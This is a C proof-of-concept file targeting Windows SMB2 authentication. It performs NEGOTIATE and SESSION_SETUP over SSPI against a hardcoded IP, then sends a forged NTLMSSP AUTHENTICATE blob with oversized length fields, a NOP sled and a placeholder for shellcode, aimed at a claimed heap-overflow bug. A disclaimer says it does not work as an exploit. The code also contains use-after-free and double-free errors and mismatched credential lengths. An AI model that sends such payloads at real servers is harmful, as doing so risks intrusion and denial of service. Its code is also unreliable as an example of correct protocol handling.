// DISCLAIMER:
// This proof-of-concept code and write-up are provided "as is," without warranty of any kind.
// They are intended solely for educational and authorized security-research purposes.
// Do not deploy or run this code against any system without explicit permission from the owner.
// Verify that your testing complies with all applicable laws, regulations, and organizational policies.
// The author and contributors assume no liability for damages or legal consequences arising from misuse.
// 
// IMPORTANT NOTE:
// This PoC does NOT exploit the SMB2 Create-Context heap-overflow bug, as the relevant parsing logic 
// has been moved out of msv1_0.dll in the latest Windows SMB2/3 implementation. 
// Use this code only as a learning reference, not as a functional exploit. 



// SMB2 Authentication PoC using SSPI
// This file demonstrates SMB2 NEGOTIATE and SESSION_SETUP with NTLM auth
// ===========================================================================

// --- Core Windows API Dependencies ---
#define SECURITY_WIN32        // Required for Security API
#define _WIN32_WINNT 0x0600  // Target Windows Vista and later
#define SMB2_HEADER_SIZE 64  // Standard SMB2 header size
#define SS_RESP_SEC_BUF_OFFSET  4  // Offset to security buffer in SESSION_SETUP response
#define SS_RESP_SEC_BUF_LENGTH  6  // Length field location in security buffer

// System headers for networking and security
#include <winsock2.h>   // Core Windows networking
#include <ws2tcpip.h>   // TCP/IP functionality
#include <windows.h>    // Core Windows API
#include <security.h>   // Security Services API
#include <sspi.h>      // Security Support Provider Interface
#include <stdio.h>      // Standard I/O
#include <stdint.h>     // Fixed-width integer types
#include <stdlib.h>     // Standard library functions
#include <string.h>     // String manipulation
#include <time.h>       // Time functions

// Link required Windows libraries
#pragma comment(lib, "Ws2_32.lib")   // Windows Sockets
#pragma comment(lib, "Secur32.lib")  // Security Services

// --- Protocol Constants ---
#define NEG_STRUCT_SIZE        36    // Size of NEGOTIATE structure
#define SESSION_SETUP_STRUCT   25    // Size of SESSION_SETUP structure
#define CTX_HDR_SZ             8    // Context header size
#define PREAUTH_CONTEXT_TYPE   0x0001  // Preauth integrity context type
#define HASH_ALGO_SHA512       0x0001  // SHA512 hash algorithm identifier
#define SALT_LENGTH            32    // Length of salt for preauth

// ==========================================================================
// Utility Functions
// ==========================================================================

// --- Hexdump Function ---
// Prints binary data in hexadecimal and ASCII format
// buf: Data buffer to dump
// len: Length of data to dump
static void hexdump(const uint8_t* buf, int len) {
    for (int i = 0; i < len; i += 16) {
        printf("%04x: ", i);
        for (int j = 0; j < 16; ++j)
            if (i + j < len) printf("%02x ", buf[i + j]);
            else printf("   ");
        printf("  ");
        for (int j = 0; j < 16 && i + j < len; ++j)
            putchar((buf[i + j] >= 32 && buf[i + j] < 127) ? buf[i + j] : '.');
        putchar('\n');
    }
}

// --- NetBIOS Header Builder ---
// Creates NetBIOS header for SMB messages
// len: Length of SMB message
// hdr: Output buffer for header (4 bytes)
static void build_netbios(uint32_t len, uint8_t hdr[4]) {
    hdr[0] = 0;
    hdr[1] = (len >> 16) & 0xFF;
    hdr[2] = (len >>  8) & 0xFF;
    hdr[3] =  len        & 0xFF;
}

// --- SMB2 Header Builder ---
// Creates standard SMB2 header
// b: Buffer to write header
// cmd: Command code
// msgid: Message ID
static void build_smb2_header(uint8_t* b, uint16_t cmd, uint64_t msgid) {
    memset(b, 0, 64);
    b[0] = 0xFE; b[1] = 'S'; b[2] = 'M'; b[3] = 'B';
    *(uint16_t*)(b + 4) = 64; // StructureSize
    b[6] = 1;                  // CreditCharge
    *(uint16_t*)(b + 12) = cmd;
    b[14] = 31;                // CreditsRequested
    *(uint64_t*)(b + 24) = msgid;  // MessageId
    // TreeId, SessionId zero for these steps
}

// --- Reliable Network Receive ---
// Ensures all requested bytes are received
// s: Socket
// buf: Buffer for received data
// len: Number of bytes to receive
static int recv_exact(SOCKET s, uint8_t* buf, int len) {
    int total = 0;
    while (total < len) {
        int r = recv(s, (char*)buf + total, len - total, 0);
        if (r <= 0) return 0;
        total += r;
    }
    return 1;
}

// --- Network Connection Handler ---
// Establishes TCP connection to target
// ip: Target IP address
// port: Target port
// timeout_ms: Connection timeout in milliseconds
static SOCKET connect_to_target(const char* ip, uint16_t port, int timeout_ms) {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return INVALID_SOCKET;
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout_ms, sizeof(timeout_ms));
    setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout_ms, sizeof(timeout_ms));
    struct sockaddr_in sa = {0};
    sa.sin_family = AF_INET;
    sa.sin_port   = htons(port);
    inet_pton(AF_INET, ip, &sa.sin_addr);
    if (connect(s, (struct sockaddr*)&sa, sizeof(sa))) {
        closesocket(s); return INVALID_SOCKET;
    }
    return s;
}

// --- SPNEGO Token Builder ---
// Builds SPNEGO negotiate token using SSPI
// buf: Output buffer
// maxlen: Maximum buffer size
// out_len: Actual token length
static int build_spnego_neg_token(uint8_t* buf, int maxlen, int* out_len) {
    // Use SSPI to get a real NegTokenInit with NTLMSSP inside SPNEGO
    CredHandle cred = {0};
    CtxtHandle ctxt = {0};
    TimeStamp expiry;
    SECURITY_STATUS ss;
    SecBufferDesc outbuf;
    SecBuffer obuf;
    outbuf.ulVersion = SECBUFFER_VERSION;
    outbuf.cBuffers = 1;
    outbuf.pBuffers = &obuf;
    obuf.BufferType = SECBUFFER_TOKEN;
    obuf.cbBuffer = maxlen;
    obuf.pvBuffer = buf;

    ss = AcquireCredentialsHandleA(
        NULL, "Negotiate", SECPKG_CRED_OUTBOUND,
        NULL, NULL, NULL, NULL, &cred, &expiry);
    if (ss != SEC_E_OK) return -1;

    ULONG ctxt_attr = 0;
    ss = InitializeSecurityContextA(
        &cred, NULL, NULL, 0, 0, SECURITY_NATIVE_DREP,
        NULL, 0, &ctxt, &outbuf, &ctxt_attr, &expiry);
    FreeCredentialsHandle(&cred);

    if (ss != SEC_I_CONTINUE_NEEDED && ss != SEC_E_OK)
        return -2;
    *out_len = obuf.cbBuffer;
    return 0;
}

// ---------------------------------------------------------------------------
// Helper: Wrap a NTLMSSP blob in a minimal SPNEGO NegTokenTarg
// Produces an ASN.1 DER structure like:
//  SEQUENCE {
//    OID 1.3.6.1.5.5.2 (SPNEGO)
//    [1] NegTokenTarg ::= SEQUENCE {
//      [0] negResult (accept-incomplete)
//      [2] responseToken ::= <our NTLMSSP blob>
//    }
//  }
// ---------------------------------------------------------------------------
static
int wrap_in_spnego_neg_token_targ(const uint8_t *ntlm_blob, int ntlm_len,
                                  uint8_t **out, int *out_len)
{
    // The OID for SPNEGO: 1.3.6.1.5.5.2
    const uint8_t spnego_oid[] = { 0x2b,0x06,0x01,0x05,0x05,0x02 };

    // Compute lengths for the nested ASN.1 structure
    int LL5 = ntlm_len;                  // Length of the NTLMSSP blob
    int LL4 = 2 + 2 + LL5;               // [2] responseToken: tag+len, OCTET STRING+len, and blob
    int LL3 = 3 + 2 + LL4;               // NegTokenTarg SEQUENCE: negResult + [2] responseToken
    int LL1 = 2 + sizeof(spnego_oid)     // SEQ { OID ... }
              + 2 + LL3;                 // ... and tagged NegTokenTarg
    int total = 2 + LL1;                 // SEQUENCE { ... }

    // Allocate the output buffer
    uint8_t *buf = malloc(total);
    if (!buf) return -1;
    uint8_t *p = buf;

    // [APPLICATION 0] SEQUENCE (SPNEGO top-level)
    *p++ = 0x60; *p++ = LL1;

    // OBJECT IDENTIFIER (SPNEGO OID)
    *p++ = 0x06; *p++ = sizeof(spnego_oid);
    memcpy(p, spnego_oid, sizeof(spnego_oid)); p += sizeof(spnego_oid);

    // [1] NegTokenTarg (explicit tag [1])
    *p++ = 0xa1; *p++ = LL3;

      // NegTokenTarg ::= SEQUENCE
      *p++ = 0x30; *p++ = LL3 - 2;

        // [0] negResult INTEGER (accept-incomplete = 0)
        *p++ = 0x02; *p++ = 0x01; *p++ = 0x00;

        // [2] responseToken (explicit tag [2])
        *p++ = 0xa2; *p++ = LL5 + 2;

          // responseToken ::= OCTET STRING <our NTLMSSP blob>
          *p++ = 0x04; *p++ = LL5;
          memcpy(p, ntlm_blob, LL5); p += LL5;

    // Return the constructed buffer and its length
    *out     = buf;
    *out_len = p - buf;  // Should equal 'total'
    return 0;
}


// ==========================================================================
// Authentication Structures and Functions
// ==========================================================================

// --- Authentication Configuration Structure ---
// Holds credential information for explicit authentication
typedef struct {
    SEC_WINNT_AUTH_IDENTITY_A auth;  // SSPI auth identity structure
    BOOL useExplicit;                // Flag for explicit credentials
} AuthConfig;

// --- SSPI Initialization Function ---
// Sets up SSPI with optional explicit credentials
// cred: Credential handle
// config: Authentication configuration
// expiry: Credential expiration timestamp
static SECURITY_STATUS init_sspi_auth(
    CredHandle* cred, 
    const AuthConfig* config,
    TimeStamp* expiry) 
{
    void* authData = NULL;
    if (config && config->useExplicit) {
        authData = (void*)&config->auth;
    }

    return AcquireCredentialsHandleA(
        NULL, "Negotiate", SECPKG_CRED_OUTBOUND,
        NULL, authData, NULL, NULL, cred, expiry);
}

// ==========================================================================
// Main Program Flow
// ==========================================================================

int main(void) {
    srand((unsigned)time(NULL));
    printf("[DEBUG] PoC starting...\n");

    // 1) Connect
    const char* target = "192.168.11.101";
    SOCKET sock = connect_to_target(target, 445, 5000);
    if (sock == INVALID_SOCKET) {
        fprintf(stderr, "[ERROR] failed to connect\n");
        return 1;
    }

    // 2) Build SMB2 NEGOTIATE (with Preauth context)
    uint16_t dialects[] = {0x0202,0x0210,0x0300,0x0302,0x0311};
    int dialectCount = sizeof(dialects)/sizeof(dialects[0]);
    int negSize = NEG_STRUCT_SIZE;
    int dialectBytes = dialectCount * 2;
    int pad = (8 - ((negSize + dialectBytes) % 8)) % 8;

    int dataLen = 2 + 2 + 2 + SALT_LENGTH;
    int ctxCount = 1;
    int payloadLen = negSize + dialectBytes + pad + (CTX_HDR_SZ + dataLen);
    uint8_t *negBuf = calloc(1, payloadLen);

    *(uint16_t*)(negBuf + 0) = NEG_STRUCT_SIZE;
    *(uint16_t*)(negBuf + 2) = dialectCount;
    *(uint16_t*)(negBuf + 4) = 0x0003; // SecurityMode = signing enabled
    *(uint32_t*)(negBuf + 8) = 1;      // Capabilities = DFS
    for (int i = 0; i < 16; i++) negBuf[12 + i] = rand() & 0xFF;
    uint8_t *p = negBuf + negSize;
    for (int i = 0; i < dialectCount; i++) *(uint16_t*)(p + i*2) = dialects[i];
    memset(p + dialectBytes, 0, pad);

    uint32_t ctxOff = 64 + negSize + dialectBytes + pad;
    *(uint32_t*)(negBuf + 28) = ctxOff;
    *(uint16_t*)(negBuf + 32) = ctxCount;
    *(uint16_t*)(negBuf + 34) = 0;

    uint8_t *ctx = negBuf + negSize + dialectBytes + pad;
    *(uint16_t*)(ctx + 0) = PREAUTH_CONTEXT_TYPE;
    *(uint16_t*)(ctx + 2) = dataLen;
    *(uint32_t*)(ctx + 4) = 0;
    uint8_t *d = ctx + CTX_HDR_SZ;
    *(uint16_t*)(d + 0) = 1; // HashAlgorithmCount
    *(uint16_t*)(d + 2) = SALT_LENGTH;
    *(uint16_t*)(d + 4) = HASH_ALGO_SHA512;
    for (int i = 0; i < SALT_LENGTH; i++) d[6 + i] = rand() & 0xFF;

    uint32_t smbLen = 64 + payloadLen;
    uint32_t pktLen = 4 + smbLen;
    uint8_t *pkt = malloc(pktLen);
    uint8_t hdr4[4];
    build_netbios(smbLen, hdr4);
    memcpy(pkt, hdr4, 4);
    build_smb2_header(pkt + 4, 0x0000, 0); // NEGOTIATE
    pkt[4 + 14] = 1; // CreditsRequested=1
    memcpy(pkt + 4 + 64, negBuf, payloadLen);

    send(sock, (char*)pkt, pktLen, 0);
    free(pkt);
    pkt = NULL;
    free(negBuf);
    negBuf = NULL;

    // Receive NEGOTIATE response
    uint8_t nb[4]; recv_exact(sock, nb, 4);
    int bl = (nb[1]<<16)|(nb[2]<<8)|nb[3];
    uint8_t* body = malloc(bl); recv_exact(sock, body, bl);
    printf("[INFO] NEGOTIATE resp:\n"); hexdump(body, bl);
    free(body);
    body = NULL;

    // Optional: Setup explicit credentials
    AuthConfig auth = {0};
    if (0) { // Change to 1 to use explicit creds
        auth.useExplicit = TRUE;
        auth.auth.Domain = (unsigned char*)"DOMAIN";
        auth.auth.DomainLength = 6;
        auth.auth.User = (unsigned char*)"testuser";
        auth.auth.UserLength = 8;
        auth.auth.Password = (unsigned char*)"testuser";
        auth.auth.PasswordLength = 11;
        auth.auth.Flags = SEC_WINNT_AUTH_IDENTITY_ANSI;
    }

    // Initialize SSPI with optional credentials
    CredHandle cred = {0};
    CtxtHandle ctxt = {0};
    TimeStamp expiry;
    SECURITY_STATUS status = init_sspi_auth(&cred, auth.useExplicit ? &auth : NULL, &expiry);
    if (status != SEC_E_OK) {
        fprintf(stderr, "[ERROR] AcquireCredentialsHandle failed: 0x%08lx\n", status);
        closesocket(sock); 
        WSACleanup(); 
        return 1;
    }

    // Add security flags for better protection
    ULONG contextReqs = ISC_REQ_CONFIDENTIALITY |
                       ISC_REQ_EXTENDED_ERROR |
                       ISC_REQ_ALLOCATE_MEMORY |
                       ISC_REQ_REPLAY_DETECT |
                       ISC_REQ_SEQUENCE_DETECT;

    // Phase 1: Initial SSPI setup
    SecBufferDesc outbuf;
    SecBuffer obuf;
    outbuf.ulVersion = SECBUFFER_VERSION;
    outbuf.cBuffers = 1;
    outbuf.pBuffers = &obuf;
    obuf.BufferType = SECBUFFER_TOKEN;
    obuf.cbBuffer = 0;  // Let SSPI allocate
    obuf.pvBuffer = NULL;

    // Acquire credentials using Negotiate package
    status = AcquireCredentialsHandleA(
        NULL, "Negotiate", SECPKG_CRED_OUTBOUND,
        NULL, NULL, NULL, NULL, &cred, &expiry);
    if (status != SEC_E_OK) {
        fprintf(stderr, "[ERROR] AcquireCredentialsHandle failed: 0x%08lx\n", status);
        closesocket(sock); 
        WSACleanup(); 
        return 1;
    }

    // Phase 1: Get SPNEGO-wrapped NTLM NEGOTIATE
    ULONG ctxt_attr = 0;
    status = InitializeSecurityContextA(
        &cred, NULL, NULL,
        contextReqs,
        0, SECURITY_NATIVE_DREP,
        NULL, 0, &ctxt, &outbuf,
        &ctxt_attr, &expiry
    );

    if (status != SEC_I_CONTINUE_NEEDED) {
        fprintf(stderr, "[ERROR] InitializeSecurityContext failed: 0x%08lx\n", status);
        FreeCredentialsHandle(&cred);
        closesocket(sock); 
        WSACleanup(); 
        return 1;
    }

    // Get negotiate blob details
    int type1_len = obuf.cbBuffer;
    uint8_t* type1_blob = (uint8_t*)obuf.pvBuffer;
    printf("[INFO] SPNEGO-wrapped NTLM NEGOTIATE length: %d\n", type1_len);

    // 4) SMB2 SESSION_SETUP #1
    int struct_len = SESSION_SETUP_STRUCT;
    int base = 64 + struct_len;
    int aligned = ((base + 7) / 8) * 8;
    int pad_len = aligned - base;
    int smb2_total = 64 + struct_len + pad_len + type1_len;  // Use type1_len instead of spnego_len
    pktLen = 4 + smb2_total;
    uint8_t *ss1_pkt = calloc(1, pktLen);

    build_netbios(smb2_total, ss1_pkt);
    build_smb2_header(ss1_pkt + 4, 0x0001, 1); // SESSION_SETUP, MsgId=1

    uint8_t* ss1 = ss1_pkt + 4 + 64;
    memset(ss1, 0, SESSION_SETUP_STRUCT);
    *(uint16_t*)(ss1 + 0) = SESSION_SETUP_STRUCT;
    ss1[2] = 0x00;  // Flags
    ss1[3] = 0x01;  // SecurityMode
    *(uint32_t*)(ss1 + 4) = 0; // Capabilities
    *(uint32_t*)(ss1 + 8) = 0; // Channel
    *(uint16_t*)(ss1 + 12) = aligned;
    *(uint16_t*)(ss1 + 14) = type1_len;  // Use type1_len instead of spnego_len
    memset(ss1 + 25, 0, pad_len);

    memcpy(ss1_pkt + 4 + aligned, type1_blob, type1_len);

    send(sock, (char*)ss1_pkt, pktLen, 0);

    // Free the type1 blob
    FreeContextBuffer(type1_blob);

    // Receive SESSION_SETUP #1 response
    recv_exact(sock, nb, 4);
    bl = (nb[1]<<16)|(nb[2]<<8)|nb[3];
    body = malloc(bl);
    recv_exact(sock, body, bl);
    printf("[INFO] SESSION_SETUP resp:\n");
    hexdump(body, bl);

    // -------------------------------------------
// Step 1: Extract the raw SPNEGO/NTLMSSP blob
// -------------------------------------------
// (right after hexdump(body, bl);)

uint16_t secOff = *(uint16_t*)(body + SMB2_HEADER_SIZE + SS_RESP_SEC_BUF_OFFSET);
uint16_t secLen = *(uint16_t*)(body + SMB2_HEADER_SIZE + SS_RESP_SEC_BUF_LENGTH);

// Bounds check
if (secOff + secLen > bl) {
    fprintf(stderr, "[FATAL] bad security‐buffer bounds\n");
    free(body);
    body = NULL;
    free(ss1_pkt);
    ss1_pkt = NULL;
    closesocket(sock);
    WSACleanup();
    return 1;
}

// Point at the SPNEGO wrapper (contains our NTLMSSP)
uint8_t *spnego_blob = body + secOff;
int spnego_len = secLen;

printf("[INFO] Raw SPNEGO blob at offset %u, length %u bytes:\n", secOff, secLen);
hexdump(spnego_blob, spnego_len);

// Don't free buffers yet - needed for MIC token handling
// Keep body and ss1_pkt allocated

// === COMMENT OUT START: old Phase-2 / SESSION_SETUP #2 block ===
#if 0
    uint16_t secOff = *(uint16_t*)(body + SMB2_HEADER_SIZE + SS_RESP_SEC_BUF_OFFSET);
    uint16_t secLen = *(uint16_t*)(body + SMB2_HEADER_SIZE + SS_RESP_SEC_BUF_LENGTH);

    if (secOff + secLen <= bl) {
        printf("[INFO] NTLM Challenge @ offset %u, length %u bytes:\n", secOff, secLen);
        hexdump(body + secOff, secLen);

        // ----------- Patch: Extract NTLMSSP from SPNEGO blob -----------
        uint8_t* spnego_blob = body + secOff;
        int spnego_blob_len = secLen;
        uint8_t* ntlmssp = NULL;
        size_t ntlmssp_len = 0;

        // Find "NTLMSSP" marker
        for (int i = 0; i < spnego_blob_len - 8; i++) {
            if (memcmp(spnego_blob + i, "NTLMSSP", 7) == 0) {
                ntlmssp = spnego_blob + i;
                ntlmssp_len = spnego_blob_len - i;
                break;
            }
        }
        if (!ntlmssp) {
            fprintf(stderr, "[ERROR] Could not find NTLMSSP in SPNEGO blob\n");
            free(body); free(ss1_pkt); FreeCredentialsHandle(&cred);
            closesocket(sock); WSACleanup(); return 1;
        }

        // --- NTLM Authenticate and all following code until MIC token logic ---
        // ...existing SESSION_SETUP #2 implementation...
        
        free(ss2_pkt);
        free(body);
    } else {
        fprintf(stderr,
            "[ERROR] invalid SecurityBuffer bounds: off=%u len=%u total=%d\n",
            secOff, secLen, bl);
        free(body); free(ss1_pkt); FreeCredentialsHandle(&cred);
        closesocket(sock); WSACleanup(); return 1;
    }

    free(ss1_pkt);
#endif
// === COMMENT OUT END ===


// === INSERT CUSTOM SESSION_SETUP #2 START ===

// --- Build a true malicious NTLMSSP AUTHENTICATE blob for the parser bug ---
size_t overflow_len = 0x200;
uint8_t *mal_auth = calloc(1, overflow_len); // Zeroed for heap safety

// [1] NTLMSSP signature and message type
memcpy(mal_auth + 0, "NTLMSSP\0", 8);      // Signature
*(uint32_t*)(mal_auth + 8) = 3;            // MessageType = 3 (Authenticate)

// [2] Forge LM response descriptor (offsets relative to start of blob)
*(uint16_t*)(mal_auth + 12) = (uint16_t)overflow_len;  // LmResponse.Length = huge
*(uint16_t*)(mal_auth + 14) = (uint16_t)overflow_len;  // LmResponse.MaxLength
*(uint32_t*)(mal_auth + 16) = 0x20;                   // LmResponse.BufferOffset

// [3] Forge NT response descriptor (can make overlap even further)
*(uint16_t*)(mal_auth + 20) = (uint16_t)overflow_len;  // NtResponse.Length
*(uint16_t*)(mal_auth + 22) = (uint16_t)overflow_len;  // NtResponse.MaxLength
*(uint32_t*)(mal_auth + 24) = 0x22;                   // NtResponse.BufferOffset

// [4] Fill payload after descriptors with NOPs, gadgets, or shellcode (test only)
size_t payload_offset = 0x30;
memset(mal_auth + payload_offset, 0x90, overflow_len - payload_offset);
// Optionally: memcpy(mal_auth + payload_offset, your_shellcode, shellcode_len);

// ── WRAP into SPNEGO NegTokenTarg *first* ──
uint8_t *wrapped; int wrapped_len;
if (wrap_in_spnego_neg_token_targ(mal_auth, overflow_len, &wrapped, &wrapped_len) < 0) {
    fprintf(stderr, "[ERROR] SPNEGO wrap failed\n");
    exit(1);
}

// Now calculate all offsets and allocation using the *wrapped* size
int struct_len2 = SESSION_SETUP_STRUCT;
int base2       = 64 + struct_len2;
int aligned2    = ((base2 + 7) / 8) * 8;
int pad_len2    = aligned2 - base2;

// Total payload: SMB2 header (64) + struct + pad + wrapped blob
uint32_t smb2_total2 = 64 + struct_len2 + pad_len2 + wrapped_len;
uint32_t pktLen2     = 4 + smb2_total2;   // include NetBIOS

uint8_t *ss2_pkt2 = calloc(1, pktLen2);
// [Header] NetBIOS + SMB2
build_netbios(smb2_total2, ss2_pkt2);
build_smb2_header(ss2_pkt2 + 4, 0x0001, 2); // SESSION_SETUP, MsgId=2

// [SESSION_SETUP struct]
uint8_t *ss2_2 = ss2_pkt2 + 4 + 64;
memset(ss2_2, 0, struct_len2);
*(uint16_t *)(ss2_2 + 0)  = struct_len2;    // StructureSize (fixed 25)
ss2_2[2]                  = 0x00;           // Flags
ss2_2[3]                  = 0x01;           // SecurityMode (signing required)
*(uint32_t *)(ss2_2 + 4)  = 0;              // Capabilities
*(uint32_t *)(ss2_2 + 8)  = 0;              // Channel
*(uint16_t *)(ss2_2 + 12) = aligned2;       // BufferOffset (after padding)
*(uint16_t *)(ss2_2 + 14) = wrapped_len;    // use wrapped_len!
memset(ss2_2 + 25, 0, pad_len2);

// [Blob] Copy exactly the SPNEGO-wrapped blob
memcpy(ss2_pkt2 + 4 + aligned2, wrapped, wrapped_len);
free(wrapped);

// --- Send the SESSION_SETUP #2 packet ---
send(sock, (char *)ss2_pkt2, pktLen2, 0);

// --- Receive response ---
recv_exact(sock, nb, 4);
bl = (nb[1]<<16)|(nb[2]<<8)|nb[3];
free(body);
body = NULL;
body = malloc(bl);
recv_exact(sock, body, bl);
printf("[INFO] SESSION_SETUP #2 response:\n");
hexdump(body, bl);

uint32_t ntstatus = *(uint32_t*)(body + 8);
printf("[INFO] SESSION_SETUP #2 NTSTATUS: 0x%08x\n", ntstatus);

// --- Clean up all heap allocations ---
free(body);           body = NULL;
free(mal_auth);       mal_auth = NULL;
free(ss2_pkt2);       ss2_pkt2 = NULL;

// === INSERT CUSTOM SESSION_SETUP #2 END ===


// --- Step 4: Optional MIC token (SESSION_SETUP #3) ---
if (status == SEC_I_CONTINUE_NEEDED) {
    printf("[INFO] Need to send MIC token...\n");
    
    // Reset output buffer for MIC token
    SecBufferDesc micDesc;
    SecBuffer micBuf;
    micBuf.BufferType = SECBUFFER_TOKEN;
    micBuf.cbBuffer = 0;
    micBuf.pvBuffer = NULL;
    
    micDesc.ulVersion = SECBUFFER_VERSION;
    micDesc.cBuffers = 1;
    micDesc.pBuffers = &micBuf;

    // Get MIC token
    status = InitializeSecurityContextA(
        &cred,
        &ctxt,
        NULL,
        contextReqs,
        0,
        SECURITY_NATIVE_DREP,
        NULL,
        0,
        &ctxt,
        &micDesc,
        &ctxt_attr,
        &expiry
    );

    if (status != SEC_E_OK) {
        fprintf(stderr, "[ERROR] Failed to get MIC token: 0x%08lx\n", status);
        free(body);
        FreeCredentialsHandle(&cred);
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Build SESSION_SETUP #3 with MIC token
    int mic_len = micBuf.cbBuffer;
    uint8_t* mic_blob = (uint8_t*)micBuf.pvBuffer;
    printf("[INFO] MIC token length: %d\n", mic_len);

    base = 64 + SESSION_SETUP_STRUCT;
    aligned = ((base + 7) / 8) * 8;
    pad_len = aligned - base;

    smb2_total = 64 + SESSION_SETUP_STRUCT + pad_len + mic_len;
    pktLen = 4 + smb2_total;
    uint8_t* ss3_pkt = calloc(1, pktLen);

    build_netbios(smb2_total, ss3_pkt);
    build_smb2_header(ss3_pkt + 4, 0x0001, 3); // MsgId=3

    // Copy SessionId from previous response
    uint64_t sessionId = *(uint64_t*)(body + 40);
    *(uint64_t*)(ss3_pkt + 4 + 40) = sessionId;

    uint8_t* ss3 = ss3_pkt + 4 + 64;
    memset(ss3, 0, SESSION_SETUP_STRUCT);
    *(uint16_t*)(ss3 + 0) = SESSION_SETUP_STRUCT;
    ss3[2] = 0x00;  // Flags
    ss3[3] = 0x01;  // SecurityMode
    *(uint32_t*)(ss3 + 4) = 0; // Capabilities
    *(uint32_t*)(ss3 + 8) = 0; // Channel
    *(uint16_t*)(ss3 + 12) = aligned;
    *(uint16_t*)(ss3 + 14) = mic_len;
    memset(ss3 + 25, 0, pad_len);

    memcpy(ss3_pkt + 4 + aligned, mic_blob, mic_len);

    send(sock, (char*)ss3_pkt, pktLen, 0);

    // Free the MIC blob
    FreeContextBuffer(mic_blob);

    // Receive SESSION_SETUP #3 response
    recv_exact(sock, nb, 4);
    bl = (nb[1]<<16)|(nb[2]<<8)|nb[3];
    free(body);
    body = NULL;
    body = malloc(bl);
    recv_exact(sock, body, bl);
    printf("[INFO] SESSION_SETUP #3 (MIC) resp:\n");
    hexdump(body, bl);

    // Now safe to free the original buffers
    free(body);
    body = NULL;
    free(ss1_pkt);
    ss1_pkt = NULL;

    // Verify final status
    uint32_t final_status = *(uint32_t*)(body + 8);
    if (final_status != 0) {
        fprintf(stderr, "[ERROR] SESSION_SETUP #3 failed: 0x%08x\n", final_status);
        free(body);
        body = NULL;
        free(ss3_pkt);
        ss3_pkt = NULL;
        FreeCredentialsHandle(&cred);
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    printf("[INFO] SPNEGO authentication completed successfully\n");
    printf("[INFO] Final SessionId: 0x%016llx\n", sessionId);

    free(ss3_pkt);
    ss3_pkt = NULL;
}

    free(body);  // Free the last response
    body = NULL;
    FreeCredentialsHandle(&cred);
    closesocket(sock);
    WSACleanup();
    return 0;
} 
